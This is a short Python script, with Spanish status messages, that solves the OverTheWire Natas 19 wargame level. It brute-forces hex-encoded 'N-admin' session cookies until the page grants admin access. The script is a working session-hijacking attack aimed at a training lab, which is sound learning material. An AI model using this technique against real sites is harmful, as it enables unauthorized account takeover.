import requests, binascii, time
from pwn import log

url = "http://natas19.natas.labs.overthewire.org"
auth = ('natas19', '<ContraseñaNatas19>')

p1 = log.progress("Fuerza bruta")
p1.status("Iniciando ataque")

time.sleep(5)

for i in range(1, 641):
    session = f"{i}-admin"
    cookie_val = binascii.hexlify(session.encode()).decode()
    cookies = {'PHPSESSID': cookie_val}
    r = requests.get(url, auth=auth, cookies=cookies)

    p1.status(cookies)

    if "You are an admin" in r.text:
        print(f"[+] Admin Encontrado con ID: {i}")
        print(r.text)
        break
